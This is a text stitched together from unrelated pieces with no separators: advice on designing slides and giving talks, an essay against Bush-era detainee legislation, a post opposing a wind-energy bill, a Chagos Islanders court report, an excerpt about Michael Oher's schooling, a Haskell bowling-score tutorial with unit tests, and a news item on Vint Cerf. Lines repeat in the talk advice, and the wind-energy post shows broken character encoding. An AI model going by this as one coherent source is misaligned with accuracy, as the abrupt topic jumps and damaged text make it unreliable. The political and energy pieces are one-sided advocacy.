I feel that they are taunting the audience : “ I could have used a readable font and big pictures , but I decided to do extra work to make them illegible . ”
Use only sans - serif fonts .
They 're easier to see from the back of the room .
( Exception : math fonts usually have serifs . )
Simplicity is the best aesthetic .
Your audience has very little time to absorb what 's on your slide , especially with you nattering on all the time .
Some people put accretions like project logos , the talk title , and the conference name on every page .
Don't .
For slides with formulae , one of my favorite tricks is to add arrows and labels pointing to the variables in a formula , reminding the audience what each one means .
Few people will remember nomenclature that you defined on a previous slide .
A talk of 30 minutes or more needs to be broken into sections , with a title slide or an outline slide demarcating each new section .
( For shorter talks , use your judgment .
Outline slides and the accompanying speeches are boring , so keep both short . )
The goal of the title slides is to alert your audience to transitions and changes of subject , and to tell it in advance what all the individual slides in the section will add up to .
( A problem description ?
An algorithm ?
A proof ?
An empirical demonstration of your idea 's wonderfulness ?
An evisceration of all previous work on the topic ? )
Your organization .
The most common mistake is to spend too much time on technical details , and too little time setting the context .
A talk of 30 minutes or less should be an advertisement for the paper , not a replacement .
Your goal is to convince your listeners that they must read your paper .
This is a very ambitious goal .
Focus on the big picture issues .
Why is the problem you are solving worth solving ?
is the problem you are solving worth solving ?
What is the core difference between your method and all those that came before ?
This is really a two - part question ( which most speakers screw up by answering only the second part ) .
What does your method accomplish that no previous method accomplishes ?
What algorithmic or methodological idea enables your method to accomplish more ?
between your method and all those that came before ?
This is really a two - part question ( which most speakers screw up by answering only the second part ) .
What is the evidence that your method is better in some circumstances ?
( And what are those circumstances ? )
that your method is better in some circumstances ?
( And what are those circumstances ? )
What is the one big idea that you want people to leave your talk with ?
If you try to get across five ideas , you will usually impart none .
If you choose one main idea and focus on advertising it , you will usually succeed .
“ Give them something to take home . ”
I will let someone else say something about organization , though .
I like the following quote from Herman Haverkort 's defunct blog enough to excerpt it here .
We got explained two models of giving a talk : the clew model and the onion model .
The clew is a logical , linear argument building up to a conclusion at the end of the talk , like a clew unwinding until you finally come to the core .
Miss one step in the talk and you lose the plot and miss the point .
And yes indeed , this is exactly what happens when I listen to most conference talks and some lectures .
In a three days ' conference , I actually follow the first five minutes of one or two dozen talks .
That is more or less it .
After those five minutes , I get lost .
I miss a “ slide ” because I am still thinking about the previous one , get distracted by some random personal associations I had with something the speaker said , or simply doze off because the speaker has a tiring accent .
The onion talk starts with the main message , and adds depth in successive layers around it , always returning to the main message between layers .
Since the main message and the main ideas are repeated often , a listener can still follow most of the talk even after dozing off for a minute .
Also the talk does not get screwed up near the end when the speaker is running out of time , because by then , the most important things have been said already and the speaker has no reason to hurry .
The final pass .
When your slides are done , go through them and examine each slide 's title carefully .
Do the titles emphasize the right things ?
I bet you can improve at least half of them .
The job of each title is to set the context and tell listeners what your words are trying to accomplish .
When audience members wake up mid-talk and try to pay attention again , the first thing they 'll do is look at your current slide 's title .
Make sure it tells them why you 're babbling on about grommets right now .
Giving the talk
Pointers .
I really , truly despise laser pointers , but this is because most people use them badly .
Astonishingly badly .
Buy an old - fashioned telescoping pointer — they 're much easier to follow with the eye .
They also force you to move around .
Speakers with laser pointers tend to roost in one spot , like barnacles excreting glue , for their entire talk .
Because a telescoping pointer forces you to gesture and walk , your voice will become more dynamic as well .
Of course , there are some venues where the screen is too big for a physical pointer .
Rule : if you must use a laser pointer , when you point at something , hold the pointer steady .
Most people try to circle an object instead of pointing at it .
Guess what ?
Nobody has a clue what you 're pointing at !
I have sat in conferences and watched one speaker after another after another do this , all oblivious to the fact that their audience has no idea what they 're indicating .
If you just saw the screen and not the speakers , you 'd think the speakers were breakdancing .
( Little - known literary fun fact : according to Dante , the third circle of Hell is the home of those who use the mouse and cursor to point at things . )
Laptops .
Before the session , remember to turn off your laptop 's screen saver .
As well as any application that might try to download the latest version of RealPlayer mid-talk .
( This is not a hypothetical occurrence . )
Another way speakers make themselves look goofy is by staring at their laptops ' screens while speaking .
It 's human nature for your audience to follow your eyes , so use human nature to your advantage .
When you look at the projection screen , the audience 's eyes will follow yours and their attention will be where you want it .
When you look at the audience , they will listen to what you say .
When you look at your laptop screen , your audience will be distracted ; they 'll neither hear what you 're saying nor see what you want them to look at .
Try to place your laptop screen where you can't see it .
Opening .
Begin a talk by introducing yourself by name , even if you 've just been introduced — unless you 've received an unusually long and clear introduction .
The session chairs who introduce people at conferences often garble the names or fail to use the microphone .
People are finishing off conversations while the chair introduces you .
The people in the back of the room probably did n't hear the introduction , even if it sounded clear to you .
If the talk is important enough ( e.g. a job talk ) , have your spiel memorized for the first few slides , so you get a smooth start no matter how flustered and tired you are .
( Of course , never memorize a whole talk , as you 'd sound terribly stilted . )
Nonverbal communication .
An infamous study by Nalini Ambady and Robert Rosenthal , “ Half a Minute : Predicting Teacher Evaluations From Thin Slices of Nonverbal Behavior and Physical Attractiveness , ” shows that students can predict a teacher 's ratings with significant accuracy after watching a 30 - second silent video clip of the teacher at work .
Resist the urge to attribute this to the superficiality of students ' ratings .
What is the nonverbal magic that an audience recognizes so quickly ?
I believe they are seeing communication uncluttered by extraneous motion , facial expressions , fidgeting , utterances , and other nonverbal behaviors so subtle that the speaker is entirely unaware of doing them .
A faint , transient facial expression or a brief unconscious twitch of the arm are enough to rob a speaker 's words of their force , and even break an audience 's attention .
But how can you fix this ?
Your mental focus .
I believe that the secret is in where you habitually place your attention .
When you speak , most of your attention is on what you are saying .
But if you 've rehearsed decently , you 'll have some mental room left over , and other thoughts will fill the vacuum .
If you could listen to a speaker 's thoughts , you might hear “ Am I going too fast ? ” or “ Are they understanding this ? ” or “ How do I look ? ” or worse yet , “ I wonder if they like me . ”
Any thought regarding whether the audience approves of you or not is the worst place to put your mental focus .
It 's like beseeching God to make you a loser .
One of the biggest epiphanies of my life is a fact that probably seems counterintuitive to most people who think for a living : if you 're already thinking of what to say next while somebody is still speaking to you , you will appear socially inept and they wo n't like you .
When you 're the one speaking , there 's a similar principle : if you 're in your head , you will look awkward and speak awkwardly .
Great speakers — like great leaders — habitually focus on the right things , which means almost anything outside their own egos .
Perhaps the best place to focus your attention is on the sensations in your own body :
How do my legs feel ?
Will I feel more relaxed if I breathe just a little deeper ?
Am I enjoying the rhythm of my voice as I speak ?
( Ideally , these are n't verbal thoughts ; they 're felt perceptions . )
The next best place is on the sensations in the bodies of your audience .
Of course , you can't know for sure what they feel , but you can empathize and try to guess .
Do n't do it in a “ Do they like me ? ” way ; your attention should be on their welfare .
Try to open your body to physical pleasure and connection .
This focus on physical sensation has several benefits .
It clarifies your communication : fidgeting and misleading gestures attenuate ; your voice and rhythm improve ; and you slow down your motions and speech .
Your focus on your body gives you more presence in the eyes of the audience , and you marshall energy toward projecting your message with congruent body language .
Your focus on the sensations of your audience makes them feel connected to you .
This sensate focus awakens your limbic system , while leaving your cerebral cortex free to do the talking .
If you 're not a natural , it takes discipline to change your habits and permanently refocus your attention .
Academics , especially mathematicians , are not known for being in their bodies .
Let it be something you practice not just when you give a formal talk , but during your day - to - day socializing .
Learning to habitually place your attention outside your ego and on your body sensations and the people around you will not only make you a better speaker ; it will improve your relationships with everyone .
Speaking .
Good speaking has rhythm .
Ever hear an entire talk delivered in a uniform , unchanging cadence , as if the whole speech was one long paragraph ?
I 've heard lots of those .
Choose key points in your talk where you wish to bestow extra emphasis .
( If you followed my advice on preparation , you know what these points are . )
Then decide how you will emphasize them .
Sometimes I do this by speaking with a particularly slow and deliberate voice .
Sometimes I say outright , “ Here 's the most important idea in this talk . ”
Silence can be articulate .
Leave a long pause right after making a key point .
Let it sink in .
There are two mental adjustments that will help you speak fluidly .
The first is a mental focus on body sensations , discussed above .
The second is to give yourself permission to take as long as you like to think of what to say next .
This is easy to say , but hardly anybody internalizes this attitude .
Do you ever find yourself saying “ Uhhhhh ” ?
If so , you do n't really believe you have permission .
Some part of you is afraid of losing your audience if you do n't fill the silence .
Tell yourself that there 's no hurry , no need to fill empty spaces with sound , and certainly no need to get to the end of your slides .
( Structure your talk so this is true ! )
The audience is too busy trying to understand your slide to care how long it takes you to think of the next sentence .
Trust yourself .
Think patiently .
The right words come faster if you do n't force them .
Demand your right to remain silent .
Never meta - comment on your speaking .
How often have you heard a speaker say , “ I guess I 'm running out of time ; I 'll just go through this quickly ” ?
Did you hear a single word he said after that ?
Silently decide what to do ; do n't burden your audience with it .
Closing .
Always end your talk by saying “ Thank you . ”
It is not pretentious — you are doing the audience a favor .
If you do not cue the audience so they know when to applaud , they will be confused and irritated .
Like most social rituals , the thanks - applause sequence comforts everyone .
Do not ask for questions until you complete it .
That 's all !
Most everything else , especially aesthetics , is learned through practice and feedback .
I could go on , but by trying to teach more I 'd teach less .
Same goes for you .
I have been told a thousand times at least , in the years I have spent reporting on the astonishing and repugnant abuses , lies and failures of the Bush administration , to watch my back .
" Be careful , " people always tell me .
" These people are capable of anything .
Stay off small planes , make sure you are n't being followed . "
A running joke between my mother and me is that she has a " safe room " set up for me in her cabin in the woods , in the event I have to flee because of something I wrote or said .
I always laughed and shook my head whenever I heard this stuff .
Extreme paranoia wrapped in the tinfoil of conspiracy , I thought .
This is still America , and these Bush fools will soon pass into history , I thought .
I am a citizen , and the First Amendment has n't yet been red- lined , I thought .
Matters are different now .
It seems , perhaps , that the people who warned me were not so paranoid .
It seems , perhaps , that I was not paranoid enough .
Legislation passed by the Republican House and Senate , legislation now marching up to the Republican White House for signature , has shattered a number of bedrock legal protections for suspects , prisoners , and pretty much anyone else George W. Bush deems to be an enemy .
So much of this legislation is wretched on the surface .
Habeas corpus has been suspended for detainees suspected of terrorism or of aiding terrorism , so the Magna Carta - era rule that a person can face his accusers is now gone .
Once a suspect has been thrown into prison , he does not have the right to a trial by his peers .
Suspects cannot even stand in representation of themselves , another ancient protection , but must accept a military lawyer as their defender .
Illegally - obtained evidence can be used against suspects , whether that illegal evidence was gathered abroad or right here at home .
To my way of thinking , this pretty much eradicates our security in persons , houses , papers , and effects , as stated in the Fourth Amendment , against illegal searches and seizures .
Speaking of collecting evidence , the torture of suspects and detainees has been broadly protected by this new legislation .
While it tries to delineate what is and is not acceptable treatment of detainees , in the end , it gives George W. Bush the final word on what constitutes torture .
US officials who use cruel , inhumane or degrading treatment to extract information from detainees are now shielded from prosecution .
It was two Supreme Court decisions , Hamdi v. Rumsfeld and Hamdan v. Rumsfeld , that compelled the creation of this legislation .
The Hamdi decision held that a prisoner has the right of habeas corpus , and can challenge his detention before an impartial judge .
The Hamdan decision held that the military commissions set up to try detainees violated both the Uniform Code of Military Justice and the Geneva Conventions .
In short , the Supreme Court wiped out virtually every legal argument the Bush administration put forth to defend its extraordinary and dangerous behavior .
The passage of this legislation came after a scramble by Republicans to paper over the torture and murder of a number of detainees .
As columnist Molly Ivins wrote on Wednesday , " Of the over 700 prisoners sent to Gitmo , only 10 have ever been formally charged with anything .
Among other things , this bill is a CYA for torture of the innocent that has already taken place . "
It seems almost certain that , at some point , the Supreme Court will hear a case to challenge the legality of this legislation , but even this is questionable .
If a detainee is not allowed access to a fair trial or to the evidence against him , how can he bring a legal challenge to a court ?
The legislation , in anticipation of court challenges like Hamdi and Hamdan , even includes severe restrictions on judicial review over the legislation itself .
The Republicans in Congress have managed , at the behest of Mr. Bush , to draft a bill that all but erases the judicial branch of the government .
Time will tell whether this aspect , along with all the others , will withstand legal challenges .
If such a challenge comes , it will take time , and meanwhile there is this bill .
All of the above is deplorable on its face , indefensible in a nation that prides itself on Constitutional rights , protections and the rule of law .
Underneath all this , however , is where the paranoia sets in .
Underneath all this is the definition of " enemy combatant " that has been established by this legislation .
An " enemy combatant " is now no longer just someone captured " during an armed conflict " against our forces .
Thanks to this legislation , George W. Bush is now able to designate as an " enemy combatant " anyone who has " purposefully and materially supported hostilities against the United States . "
Consider that language a moment .
" Purposefully and materially supported hostilities against the United States " is in the eye of the beholder , and this administration has proven itself to be astonishingly impatient with criticism of any kind .
The broad powers given to Bush by this legislation allow him to capture , indefinitely detain , and refuse a hearing to any American citizen who speaks out against Iraq or any other part of the so - called " War on Terror . "
If you write a letter to the editor attacking Bush , you could be deemed as purposefully and materially supporting hostilities against the United States .
If you organize or join a public demonstration against Iraq , or against the administration , the same designation could befall you .
One dark - comedy aspect of the legislation is that senators or House members who publicly disagree with Bush , criticize him , or organize investigations into his dealings could be placed under the same designation .
In effect , Congress just gave Bush the power to lock them up .
By writing this essay , I could be deemed an " enemy combatant . "
It 's that simple , and very soon , it will be the law .
I always laughed when people told me to be careful .
I 'm not laughing anymore .
In case I disappear , remember this .
America is an idea , a dream , and that is all .
We have borders and armies and citizens and commerce and industry , but all this merely makes us like every other nation on this Earth .
What separates us is the idea , the simple idea , that life , liberty and the pursuit of happiness are our organizing principles .
We can think as we please , speak as we please , write as we please , worship as we please , go where we please .
We are protected from the kinds of tyranny that inspired our creation as a nation in the first place .
That was the idea .
That was the dream .
It may all be over now , but once upon a time , it existed .
No good idea ever truly dies .
The dream was here , and so was I , and so were you .

In an era when global warming is increasingly seen as the number one problem facing the nation , and our president has said we are addicted to foreign oil , the last thing we need is legislation that would cripple the wind industry .
Rep. Nick Rahall ( D - WV ) , a man known for his support of large coal subsidies and who once said about coal “ For so many , filthy coal is a dirty four - letter word , these individuals , I tell you , have their heads buried in the sand . ” ( via ) has just introduced a bill ( H.R. 2337 full text of bill . txt file ) that would place enormous , wrong - headed restrictions on Americaâ€™s growing wind energy efforts .
If enacted , the bill would severely hurt farmers , ranchers and other landowners who have â€ “ or want to have â€ “ clean , income - producing , wind energy turbines on their property .
Anti-Wind Energy Section of H.R. 2337 , establishes onerous standards for siting , construction , monitoring , and adaptive management that must be satisfied by all wind projects to avoid , minimize , and mitigate adverse impacts on migratory birds and bats despite the fact that wind turbines cause less than 0.003 % of human - cause bird mortality .
The bill would impose :
Imprisonment and a $ 50,000 fine for placing a wind turbine on private property without first gaining approval from bureaucrats including the head of the U.S. Fish & Wildlife Service .
Impose a heavy - handed â€œsolutionâ€  where there is no significant problem :
The bill claims to protect birds by placing onerous new regulations on wind turbines .
Meanwhile , vastly more birds â€ “ on a scale of 10,000 to less than one â€ “ are killed by house cats and plate glass windows than by a single wind turbine .
The bill completely ignores the most serious effects of continued reliance on traditional fossil fuels , human - induced global warming , which the Intergovernmental Panel on Climate Change has associated with mass extinctions of species .
The main problem with this legislation is its vague and sweeping nature .
I also think its unfair to regulate wind so harshly when coal and oil plants do not have to account for “ the potential cumulative impact that a proposed wind project would have on such wildlife in combination with other existing or proposed wind projects . ” ( imagine if the word wind was replaces with coal ) .
There is no way another coal fired power plant would ever be built if the cumulative effects of the project in combination with other plants was taken into account .
If we took into account the thousands of coal plants being built all over the world we would quickly see that they pose an IMMENSE “ risk to birds bats and other wildlife ” not to mention human beings .
This legislation has the stink of the fossil fuel industry all over it * cough * coal * cough * , and should be taken for what it is , an attempt to halt a rapidly growing and vibrant industry that poses a great threat to big carbons financial interests .
Coal companies are clearly worried that the wind industry is going to muscle in on their profit margins .
It would be a foolish , and potentially fatal mistake if we continue to allow this country to go down the wrong energy path .
We need renewable clean energy now !
Tell Congress to oppose the Anti-Wind Energy Section of H.R. 2337
Please email or call your Representative to request that he or she oppose the Subtitle D Anti-Wind Energy Section of H.R. 2337 .
What follows is a sample letter to get you started .
Oppose the Anti-Wind Energy Section of H.R. 2337
I am writing to request that you oppose the Subtitle D Anti-Wind Energy Section of H.R. 2337 , sponsored by Rep. Nick Rahall ( D - WV ) , which imposes new certification requirements that would bring wind energy development across the U.S. to a grinding halt .
Anti-Wind Energy Section of H.R. 2337 , establishes onerous standards for siting , construction , monitoring , and adaptive management that must be satisfied by all wind projects to avoid , minimize , and mitigate adverse impacts on migratory birds and bats despite the fact that the National Academy of Sciences has concluded wind turbines cause less than 0.003 % of human - cause bird mortality .
( This is at least one thousand times lower than the mortality associated with house cats . )
The Anti-Wind Energy Section of H.R. 2337 is unnecessary , unworkable and unfair .
Wind energy is no threat to birds relative to other human activities .
H.R. 2337 would make it a criminal act to generate wind power energy after the billâ€™s unrealistic certification deadlines pass .
Landowners and farmers could face jail or a $ 50,000 penalty for putting a wind turbine â€ “ of any size â€ “ on their private property without certification by the Director of the U.S. Fish & Wildlife Service .
The legislation singles out wind power for burdensome requirements and ignores wildlife impacts associated with other energy sources .
The bill completely ignores the most serious effects of continued reliance on traditional fossil fuels , human - induced global warming , which the Intergovernmental Panel on Climate Change has associated with mass extinctions of species .
A widely reported 2004 international study found that up to one million species may be driven extinct by global warming by 2050 .
I request that you oppose the Subtitle D Anti-Wind Energy Section of H.R. 2337 .
Sincerely

Hundreds of Indian Ocean islanders who were forcibly deported from their homeland by Britain 40 years ago won a battle yesterday which could see them set sail for an emotional return within days .
The court of appeal in London found the British government guilty of " abuse of power " for attempting to prevent the Chagos Islanders from reclaiming land leased from under their feet by Britain to the US in the 1960s .
Three judges upheld a ruling in the islanders ' favour last year , ordered the government to pay their legal costs and withheld support for an appeal to the House of Lords .
Giving his reason for the ruling Lord Justice Sedley wrote : " Few things are more important to a social group than its sense of belonging , not only to each other but to a place .
What has sustained peoples in exile , from Babylon onwards , has been the possibility of one day returning home . "
The judge added : " The barring of that door , however remote or inaccessible it may be for the present , is an act requiring overwhelming justification . "
An estimated 2,000 Chagossians were driven from their homes between 1967 and 1971 after Britain made a secret deal to lease the island of Diego Garcia to the US for use as an airbase .
They were tricked out of their homes , encouraged to leave on temporary trips , and not allowed back .
Later , the islanders were subjected to intimidation .
At one point US soldiers rounded up their dogs and gassed them .
The departing Chagossians were loaded on to boats , allowed to take only one bag with them , and deposited in Mauritius , where most have lived in poverty ever since .
The base has served as a refuelling stop and base for air raids in a succession of wars , most recently in Afghanistan and Iraq .
Yesterday 's ruling was greeted by silence from the Chagossians in court , who have seen hopes of a return dashed several times in their four - decade exile .
But Olivier Bancoult , their leader in exile who took the foreign office to court , emerged smiling holding his fingers up in a victory sign .
" I 'm very happy for my people , " Mr Bancoult told a crowd of supporters and journalists .
" We will go back and make Chagos great . "
The Foreign Office said it was " disappointed " by the ruling , and said it would consider an appeal to the House of Lords .
A spokeswoman said , the islanders " in theory " now had a right to go home .
Chagossians - who are descended from 18th century African and Indian labourers on French coconut plantations - are not seeking to resettle Diego Garcia itself , but other islands in the archipelago , which are from 60 to 100 miles away .
US and British officials have argued that raids on the air base could be launched from those other islands , or they could be used to observe the movement of warplanes .
But yesterday 's ruling meant that three British courts have decided , in effect , that security concerns cannot trump the right of the Chagos islanders to return home .
After a court declared the islanders ' expulsion illegal in 2000 , the government took the unusual step of blocking their return by " orders in council " , a use of royal prerogative that bypassed parliament .
Last year 's decision and yesterday 's ruling deemed those decrees illegitimate .
Lord Justice Sedley declared them to be " unlawfully made , because their content and the circumstances of their enactment constitute an abuse of power . "
Richard Gifford , the Chagossians ' lawyer , said his clients " now call upon the British government for a new start in this abusive relationship . "
He added that he expected the new Democratic majority in the US Congress to endorse the Chagossians ' return , and could award them restitution for the harm they have suffered .
Fewer than half of the original 2,000 islanders deported are thought to be still alive , and most of the survivors are over 50 .
Many Chagossians suspect the British government of using delaying tactics designed to put off a resolution until the survivors have all died off .
Two hundred have died since they won their original case in 2000 and 17 passed away in the three months it took the Court of Appeal to reach yesterday 's judgment .
Roch Evenor left the island when he was four .
His parents hoped to go back but both have died .
Mr Evenor , now 50 , said : " I 'm sad it is taken so much time to settle something so straightforward , a matter of simple human rights . "

Thus began the great Mormon grade - grab .
Mainly it involved Sue Mitchell grinding through the character courses with Michael .
Every week or so , they replaced a Memphis public school F with an A from B.Y.U. Every assignment needed to be read aloud and decoded .
Here he was , late in his senior year in high school , and he had never heard of a right angle or the Civil War or “ I Love Lucy . ”
But getting the grades was far easier than generating in Michael any sort of pleasure in learning .
When Briarcrest gave him a list of choices of books to write a report on , Mitchell , thinking it might spark Michael ’s interest , picked “ Great Expectations . ”
“ Because of the character of Pip , ” she says .
“ He was poor and an orphan .
And someone sort of found him .
I just thought Michael might be able to relate . ”
He could n’t .
She tried “ Pygmalion . ”
Again , he had n’t the faintest interest in the thing .
They got through it by performing the work aloud , with Michael assigned to the role of Freddie .
“ He does wonderful memory work , ” Mitchell says .
“ It ’s a survival technique .
You can give him anything , and he ’ll memorize it . ”
But that ’s all he did .
Engaging with the material in any deeper way seemed impossible .
He was as isolated from the great works of Western literature as he was from other people .
“ If you asked him why we ’re doing all this , ” she says , “ he ’d say , ‘ I got to do it to get to the league . ” ’
XI . Graduation
There was one final piece of unfinished business in Michael Oher ’s Briarcrest career .
The senior yearbook picture was due , and Michael did n’t have one .
It was a Briarcrest tradition for every senior to have his baby picture in the senior program .
Her lack of a baby picture for Michael drove Leigh Anne to distraction .
“ You do n’t want to be the only senior who does n’t have a baby picture in the annual ! ” she told him .
She made Michael give her the name of the foster home he admitted to having lived in when he was 8 .
She called the foster mother , who sounded vague ; at any rate , she had nothing on him .
She went down to his biological mother ’s apartment and harassed her for pictures .
Later , she finally came upon one shot , taken by an employee of the Tennessee Department of Children ’s Services when Michael was about 10 years old .
She brought it home and gave it to Michael .
Michael looked at it and exclaimed , “ Mama , that ’s me ! ”
“ That sure is you ! ” she said .
Then he took it into the den and stared at it for 15 minutes .
But the picture did n’t solve the problem .
It was n’t a baby picture .
One spring night Leigh Anne had an idea .
She flipped on her computer and went online and found , as she puts it , “ the cutest picture of a little black baby I could find . ”
She downloaded the stranger ’s photo and sent it in to Briarcrest .
The Briarcrest Christian School held its graduation ceremony in a church in May 2005 .
The Tuohys were all in the audience , of course , and they brought Sue Mitchell with them .
Steve Simpson was there , and so was Jennifer Graves , who says that she has never seen anyone work so hard for a piece of paper as Michael Oher worked to get his Briarcrest diploma .
Big Tony was on hand — even though his son , Steven , would n’t graduate until the following year .
The Briarcrest president gave a long speech filled with many words of warning to the graduating class .
He explained that when they left Briarcrest and went out into the world , they would encounter “ all kinds of groups that claim some kind of privilege based on their lifestyles or perversions . ”
( There was no need to say “ gay ” ; they knew all about sodomy . )
He spoke sternly about the danger of “ seeking false happiness in a variety of narcissistic pleasures . ”
After that final jolt of fear from God , the graduates were called forward to collect their rewards .
Steve Simpson called their names , one by one ; one by one , they stepped up .
Michael was n’t called until nearly the end .
He sat waiting in the back row , upper lip tucked beneath lower , either choking back his emotion or settling his nerves .
“ Michael Jerome Oher , ” said Steve Simpson and smiled .
XII .
Collegebound
The N.C.A.A. still needed its proof of Michael ’s new and improved grade - point average by Aug .
1 . Ole Miss was willing to admit Michael Oher as a student , but the N.C.A.A. stood between them in a couple of ways .
First , it had opened an investigation and voiced the suspicion that the Tuohys had become Michael ’s guardians and put him into their wills as an equal of their own children only so that he might play left tackle for their alma mater .
Next , the N.C.A.A. said his grade - point average was just a tad too low for him to play college football .
On July 29 , Michael took his final B.Y.U. test — another character course .
Sean sent the test to Utah by Federal Express , and the B.Y.U. people promised to have the grade ready by 2 o’clock the following afternoon .
“ The Mormons may be going to hell , ” Sean says .
“ But they really are nice people . ”
With Michael ’s final A in hand , Sean rushed the full package to the N.C.A.A. ’s offices in Iowa .
The N.C.A.A promptly lost it .
Sean threatened to fly up on his plane with another copy and sit in the lobby until it was processed — which led the N.C.A.A. to find Michael ’s file .
While it remained suspicious and did n’t close its investigation , the N.C.A.A. on Aug. 1 , 2005 , informed Michael
Oher that he was going to be allowed to go to college and play football .
One year later , Michael Oher was a first - team freshman All - American , the starting left tackle of the Ole Miss Rebels and the most awesome force on a football field that a lot of college line coaches had ever seen .
He was on a collision course with the second - highest - paid job in the N.F.L .
He could read and write and now blended so well socially into rich white Memphis that rich white Memphis almost forgot he was black .
Drowned in nurture , his I.Q. test score had risen between 20 and 30 points .
And his new parents , Sean and Leigh Anne Tuohy , were so pleased with the results of their experiment that they began to figure out how best to go back into the inner city and do it all over again .

Ex-election officials sue over late ballot plan
Two former Republican secretaries of state filed a lawsuit Tuesday , challenging Michigan 's plan to count absentee ballots that arrive late .
Bowling is a tricky game to score .
It 's just complicated enough to act as a good programming exercise .
And Ron Jeffries has performed this exercise many times , in C# , Smalltalk , and other languages .
He 's been searching for a tidy and elegant solution , one which makes the rules of bowling as clear as possible .
In the past , though , Jeffries has been a bit skeptical of Haskell implementations of bowling :
The recursive [ Haskell ] solution , however , is questionable on more fundamental grounds .
A game of bowling consists of ten frames , not less or more , and the " ten-ness " of the game is not represented in the recursive solutions at all .
Even if we let that slide , the recursive solutions make it a bit hard to understand what 's going on .
Let 's see if we can do better .
No knowledge of bowling is required -- if we do this right , our program should be at least as clear as an English - language version of the rules .
Along the way , we 'll encounter lazy lists , an interesting recursion combinator , and Hoogle , the Haskell search engine .
The rules of bowling
In bowling , we roll balls down a lane , trying to knock down pins .
If we know how many pins we knock down with each ball , we can compute the final score .
So our program looks something like this :
-- Pins knocked down by each ball .
type Balls = [ Int ] --
Number of points scored .
type Score = Int scoreGame :: Balls ->
Score scoreGame balls = ???
But how do we implement scoreGame ?
Scoring a frame
A bowling game is divided into 10 frames .
Ordinary frames consist of 1 or 2 balls .
The 10th frame may have an additional 1 or 2 bonus balls , which we discuss below .
To score an individual frame , we need to do two things : ( 1 ) calculate the score for our frame , and ( 2 ) figure out where the next frame starts .
Our scoring function will return both pieces of information :
-- Score one frame and return the rest .
scoreFrame :: Balls -> ( Score , Balls )
If we knock down all 10 pins with the first ball in a frame ( x1 ) , we call it a strike , and move on to the next frame immediately .
But we also get a bonus --- we 're allowed to count balls y1 and y2 from the next frame towards this frame 's score :
scoreFrame ( x1 : y1 : y2 : ys ) | x1 == 10 = ( x1 + y1 + y2 , y1 : y2 : ys ) --
Strike
If we knock down all the pins using two balls ( x1 and x2 ) , we call it a spare .
And we get to count one ball from the next frame as our bonus :
scoreFrame ( x1 : x2 : y1 : ys ) | x1 + x2 == 10 = ( x1 + x2 + y1 , y1 : ys ) --
Spare
If we do n't manage to knock all 10 pins with two balls , we call it an open frame .
And we do n't get any bonus :
scoreFrame ( x1 : x2 : ys ) = ( x1 + x2 , ys ) --
Open frame
What happens if we have a strike or a spare in the 10th frame ?
We get to roll our bonus balls anyway .
Conventionally , these extra balls are recorded as part of the 10th frame ( making it 3 balls long ) , but they 're really just phantom balls hanging off the end of the game .
Next , we need to turn scoreFrame into a recursive function .
Tying it all together
Let 's take another look at the type declaration for scoreFrame , and expand our type aliases :
scoreFrame :: Balls -> ( Score , Balls ) scoreFrame :: [ Int ] -> ( Int , [ Int ] )
We can abstract this type even further , replacing the types with type variables :
[ a ] -> ( b , [ a ] )
Given a function of type [ a ] -> ( b , [a ] ) , and a list of type [ a ] , we want to apply our function repeatedly , collecting all the values of type b into a list .
So we 're looking for a function of type :
reduce :: ( [ a ] -> ( b , [ a ] ) ) -> [ a ] -> [ b ]
Whenever we need an abstract function like this , our first stop should be Hoogle , the Haskell search engine .
Unfortunately , Hoogle can't find a function with this type , so we 'll need to write it ourselves :
reduce f ys = x : reduce f ys ' where ( x , ys ' ) = f ys
This says , " Given a function f and a list ys , apply f to ys to get x and ys ' .
Then build a list starting with x .
To get the rest of the list , call ourselves recursively on ys ' . "
Notice that we never bother to specify a base case !
Because Haskell is a lazy language , we only compute as much of the list as we need .
If we apply reduce to scoreFrame , we get the recursive function we 're looking for :
reduce scoreFrame :: Balls -> [ Score ]
And now we 're ready to tie it all together :
scoreGame :: Balls ->
Score scoreGame balls = sum ( take 10 ( reduce scoreFrame balls ) )
Given a list of balls , we reduce it to a list of individual frame scores .
Then , we take the scores of the first 10 frames and sum them .
( The full program is available in my darcs repository . )
Unit Testing in Haskell
Of course , we need some unit tests .
We 'll want functions to generate lists of good and bad throws :
-- A list of ' n ' perfect balls .
perfect n = replicate n 10 -- A list of ' n ' gutter balls .
gutter n = replicate n 0
Here are some sample games , with the desired scores .
We pay careful attention to the 10th frame :
testData :: [( Balls , Score ) ] testData = [ ( 10 : perfect 11 , 300 ) , -- Strike ( 9 : 1 : perfect 11 , 290 ) , -- Spare ( 8 : 1 : perfect 11 , 279 ) , -- Open frame ( 8 : 1 : 9 : 1 : perfect 10 , 269 ) , ( 7 : 2 : 6 : 3 : perfect 10 , 258 ) , ( perfect 9 ++ [ 10 , 10 , 0 ] , 290 ) , ( perfect 9 ++ [ 10 , 5 , 5 ] , 285 ) , ( perfect 9 ++ [ 10 , 0 , 10 ] , 280 ) , ( perfect 9 ++ [ 10 , 0 , 0 ] , 270 ) , ( perfect 9 ++ [ 9 , 0 ] , 267 ) , ( perfect 9 ++ [ 9 , 1 , 5 ] , 274 ) , ( gutter 20 , 0 ) ] --
Missed all
We can run our tests using HUnit :
-- Construct a unit test asserting that -- we calculate the expected score .
testFromData ( balls , score ) = ( " Scoring " ++ show balls ) ~ : score ~= ? scoreGame balls --
Build a list of tests and run it .
tests = test ( map testFromData testData ) main = runTestTT tests
A note on test - driven design
Few programmers are willing to write programs in public .
It 's too embarrassing --- too many false starts , too much confusion .
We 'd rather polish our programs in secret , and release only finished work .
Ron Jeffries , though , is an exception to this rule .
He designs programs in public , muddling through all the obstacles .
And this admirable habit does make him look bad at times .
But Jeffries takes these risks , willingly , to promote test - driven development ( TDD ) .
He begins with test cases , and grows a program organically , extending and refining it as he goes .
It 's an admirably hands - on style , and I 've seen it produce some beautiful programs .
But for this program , all the design work happened in my head , while I was away from the computer .
I wrote the actual code test - first , but there was never any doubt about how scoreFrame and reduce would fit together .
Do you have a more elegant solution ?
Please feel free to share it !
Dr Vint Cerf , one of the founders of the internet and now a senior executive with Google , has cast doubt on the efficacy of recent attempts to curb cyber bullying by blocking student access to video - sharing sites such as YouTube .
Interviewed in Brisbane where he was due to make his only public appearance in Australia later today , Dr Cerf said it was clear that many schoolchildren had the wherewithal to circumvent the ban .
" I believe that many young people have those skills that may be well beyond those of their parents and their teachers and will find ways of accessing information , " he said in a telephone interview .
Instead , he said , students should be taught about social responsibility .
" This is a classic example of what happens in extremely open environments where everyone has an opportunity to produce content and to put it up on the net , " he said .
